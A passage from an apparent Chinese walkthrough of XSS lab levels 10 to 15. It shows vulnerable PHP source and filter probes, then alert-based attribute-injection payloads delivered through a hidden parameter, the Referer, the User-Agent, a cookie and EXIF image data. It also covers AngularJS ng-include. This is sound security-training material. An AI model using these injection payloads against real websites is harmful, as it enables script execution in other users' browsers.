title="level10"></a>level10</h2><p>http://192.168.31.193:8080/level10.php?keyword=well%20done!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form id=search&gt;&lt;input name="t_link"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_history"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_sort"  value="'</span><span class="token operator">.</span><span class="token variable">$str33</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><p>没有显示处理内容，但是发现<strong>三个隐藏标签</strong></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_link<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_history<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可能这些参数处理了内容</p><p>测试这三个参数</p><p><code>?t_link=&lt;script " 'Oonn&gt;</code>没有内容</p><p><code>?t_history=&lt;script " 'Oonn&gt;</code>没有内容</p><p><code>?t_sort=&lt;script " 'Oonn&gt;</code>有内容</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script <span class="token punctuation">"</span></span> <span class="token attr-name">'Oonn"</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前后括号被过滤了。</p><p>将payload设置成可以点击可以弹窗的<strong>按钮</strong>。</p><p><code>?t_sort=click"type="button" onclick="alert(/xss/)</code></p><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>http://192.168.31.193:8080/level11.php?keyword=good%20job!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form id=search&gt;&lt;input name="t_link"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_history"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_sort"  value="'</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str00</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_ref"  value="'</span><span class="token operator">.</span><span class="token variable">$str33</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_link<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_history<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_ref<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>有4个隐藏标签</p><p>使用上一关的payload测试一下第四个参数</p><p><code>?t_ref=click"type="button" onclick="alert(/xss/)</code></p><p>依旧没有结果</p><p>burpsuip抓包查看参数怎么来的</p><p>猜测t_ref是referer地址来源</p><p><img src="picture/image-20221120190357176.png" alt="image-20221120190357176"></p><p><code>click"type="button" onclick="alert(/xss/)</code></p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>http://192.168.31.193:8080/level12.php?keyword=good%20job!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form id=search&gt;&lt;input name="t_link"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_history"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_sort"  value="'</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str00</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_ua"  value="'</span><span class="token operator">.</span><span class="token variable">$str33</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><p>也没有显示输入的内容，</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_link<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_history<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_ua<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但也有4个隐藏传参,</p><p>发现t_ua这个参数就是useragent</p><p><img src="picture/image-20221120191102558.png" alt="image-20221120191102558"></p><p><code>click"type="button" onclick="alert(/xss/)</code></p><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>http://192.168.31.193:8080/level13.php?keyword=good%20job!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"call me maybe?"</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form id=search&gt;&lt;input name="t_link"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_history"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_sort"  value="'</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str00</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_cook"  value="'</span><span class="token operator">.</span><span class="token variable">$str33</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><p>也没有显示输入的内容</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_link<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_history<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_cook<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>call me maybe?<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>4个隐藏参数，猜测t_cook是cookie</p><p><img src="picture/image-20221120192620976.png" alt="image-20221120192620976"></p><p>改cookie中的user</p><p><img src="picture/image-20221120192546998.png" alt="image-20221120192546998"></p><p><code>user=click"type="button" onclick="alert(/xss/)</code></p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>http://192.168.31.193:8080/level14.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>center<span class="token operator">&gt;</span><span class="token operator">&lt;</span>iframe name<span class="token operator">=</span><span class="token string double-quoted-string">"leftframe"</span> marginwidth<span class="token operator">=</span><span class="token number">10</span> marginheight<span class="token operator">=</span><span class="token number">10</span> src<span class="token operator">=</span><span class="token string double-quoted-string">"http://www.exifviewer.org/"</span> frameborder<span class="token operator">=</span>no width<span class="token operator">=</span><span class="token string double-quoted-string">"80%"</span> scrolling<span class="token operator">=</span><span class="token string double-quoted-string">"no"</span> height<span class="token operator">=</span><span class="token number">80</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>center<span class="token operator">&gt;</span><span class="token operator">&lt;</span>center<span class="token operator">&gt;</span>这关成功后不会自动跳转。成功者<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token operator">/</span>xsschallenge<span class="token operator">/</span>level15<span class="token operator">.</span>php<span class="token operator">?</span>src<span class="token operator">=</span><span class="token number">1.</span>gif<span class="token operator">&gt;</span>点我进level15<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>center<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span>这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这一关iframe调用的文件地址失效，已经无法测试了。 </p><p>这里可以简单复现一下这种触发XSS的环境。</p><p>可交换图像文件格式英语：Exchangeable image file format， 官方简称<strong>Exif</strong> </p><p>是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。</p><p>可使用鼠标右键 进入属性页面查看部分信息。</p><p>有些网站有<strong>读取图片exif信息</strong>的功能</p><p>当网站读取到的恶意的exif信息就会触发这个payload</p><p>先创建一个exifxss.php的文件 </p><p>然后在当前文件夹下面放一张名为404.jpg的数码图片</p><p><img src="picture/image-20221120205022092.png" alt="image-20221120205022092"></p><p><code>'"&lt;script&gt;alert(2)&lt;/script&gt;</code></p><p><strong>下载Exif Viewer插件</strong></p><p>https://chromecj.com/Handler/Download/56</p><p>接着访问一下 http://192.168.31.193:8080/404.jpg</p><p><img src="picture/image-20221120205738703.png" alt="image-20221120205738703"></p><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>http://192.168.31.193:8080/level15.php?src=1.gif</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>$str = $_GET["src"];echo '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ng-include:'.htmlspecialchars($str).'<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过第一行以及我们提交的参数src的值被插入到标签的class属性值中</p><p>发现这里用了angular.min.js的<strong>ng-include</strong></p><p>将国外的angular.min.js换成国内的js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>cdn<span class="token punctuation">.</span>staticfile<span class="token punctuation">.</span>org<span class="token operator">/</span>angular<span class="token punctuation">.</span>js<span class="token operator">/</span><span class="token number">1.4</span><span class="token number">.6</span><span class="token operator">/</span>angular<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其作用相当于php的<strong>include函数</strong>。</p><p>这里就是将1.gif这 个<strong>文件包含</strong>进来。</p><h3 id="ng-include指令具体的用法"><a href="#ng-include指令具体的用法" class="headerlink" title="ng-include指令具体的用法"></a>ng-include指令具体的用法</h3><ol><li>ng-include 指令用于包含外部的 HTML文件。 </li><li>包含的内容将作为指定元素的子节点。 </li><li>ng-include 属性的值可以是一个表达式，返回一个文件名。</li><li>默认情况下，包含的文件需要包含在同一个域名下。</li></ol><h4 id="特别值得注意："><a href="#特别值得注意：" class="headerlink" title="特别值得注意："></a>特别值得注意：</h4><ol><li>ng-include,如果单纯指定地址，必须要加引号 </li><li>ng-include,加载外部html，script标签中的内容不执行 </li><li>ng-include,加载外部html中含有style标签样式可以识别</li></ol><p>查看网页源代码</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ng-include:1.gif<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" 